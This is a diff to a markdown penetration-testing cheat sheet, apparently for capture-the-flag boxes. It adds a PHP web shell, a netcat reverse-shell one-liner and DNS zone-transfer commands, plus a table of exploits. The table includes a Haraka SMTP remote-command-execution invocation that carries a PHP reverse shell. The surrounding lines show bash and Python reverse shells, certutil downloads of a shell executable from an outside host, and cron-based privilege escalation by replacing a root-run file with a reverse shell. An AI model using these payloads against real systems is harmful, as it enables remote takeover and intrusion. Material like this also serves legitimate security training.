@@ -21,7 +21,11 @@ Once this is running, enter this command to start the reverse shell
 ```bash
 Start-Process "shell-name.exe"
 use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-ip set LPORT listening-port run
+```
 
+### PHP System Command:
+```php
+<?php echo(system($_GET["cmd"])); ?>
 ```
 ### Reverse shells One liner:
 
@@ -59,6 +63,11 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 <?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'");
 ```
+### netcat OpenBSD
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4242 >/tmp/f
+```
 
 ## References
 
@@ -70,9 +79,16 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.2/443 0>&1'");
 
 
 
+## Enumerations
+### DNS
+if the port 53 is open try to find if if there are some name resolved. /etc/resolv.conf ---> victim IP
 
+dig -x <victim-ip>
 
-### Random Exploit collection
+Eg. dig cronos.htb any
+For whole zone tranasfer dig axfr @10.10.10.13 cronos.htb
+
+##Random Exploit collection
 
 Here I am collectign some of the random exploits and their exploitation technqiues. Later I will categorised and group them to each group.
 
@@ -82,9 +98,9 @@ Here I am collectign some of the random exploits and their exploitation technqiu
 | 2.|ThinVNC  1.0b1  | Authentication Bypass CVE-2019-17662 | VNC running in port 3389 and can be exploited using password lookup, can be accessed using Browser|[Exploit 47519](https://www.exploit-db.com/exploits/47519). Simply using Burp suite also reveals the password here as well.  |to get reverse shell first get the password of admin user and then login. After you can use nc.exe to connect to the Kali. |[Video](https://www.youtube.com/watch?v=uNll_EYri0A)|
 |3.|Haraka SMTP < 2.8.9 |Remote Command Execution |runing in different port than 25 in Linux |[Exploit 41162](https://www.exploit-db.com/exploits/41162) only need to change the port |```python 41162.py -c "php -r '\$sock=fsockopen(\"192.168.100.1\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" -t root@haraka.test -m 192.168.200.1``` or bash method.  |[Similar HTB writeup](https://0xdf.gitlab.io/2019/04/13/htb-redcross.html)|
 |4.|BlogEngine 3.3.6.0|Authentication Bypass & Directory Traversal [CVE-2019-6714](https://nvd.nist.gov/vuln/detail/CVE-2019-6714)|Need to guess the password using Hydra "hydra -l \<username> -P /usr/share/wordlists/\<wordlist> \<ip> http-post-form" Most of the command consists of the string after “http-post-form”. This string has three parts divided by colons — “path to the login form page : request body : error message indicating failure” use burp suite to get all the details.|Login using the admin and brute forced pass. Get the verison of BlogEngine You have to upload the file  PostView.ascx to access the shell. Follow the exploit [46353](https://www.exploit-db.com/exploits/46353)| Modify the exploit to have ip. | [Writeup](https://medium.com/@nickbhe/tryhackme-hackpark-writeup-db34b7957bef)|
+|5. |PHP log poisoning | https://www.hackingarticles.in/apache-log-poisoning-through-lfi/ | https://0xdf.gitlab.io/2018/09/08/htb-poison.html | --- | --- | --- |
+|6.|IIS6.0 | [Zero day exploit to get reverse shell](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269/blob/master/iis6%20reverse%20shell) |- |- |-|
 
-
-For more details see [GitHub Flavored Markdown](https://guides.github.com/features/mastering-markdown/).
 
 ## Linux Privilege Escalation
 
@@ -120,6 +136,10 @@ certutil.exe -urlcache -split -f http://10.2.26.129/winPEAS-x64.exe winPEAS-x64.
 certutil.exe -urlcache -split -f http://10.2.26.129/shell.exe shell.exe
 
 
+### Cron job running by root.
+Eg. * * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1
+
+In this case you can simply replace the /var/www/laravel/artisan file with one liner php reverse shell.
 
 ### Windows Privilege Escalation
 ## Iperius Backup 6.1.0 - Privilege Escalation
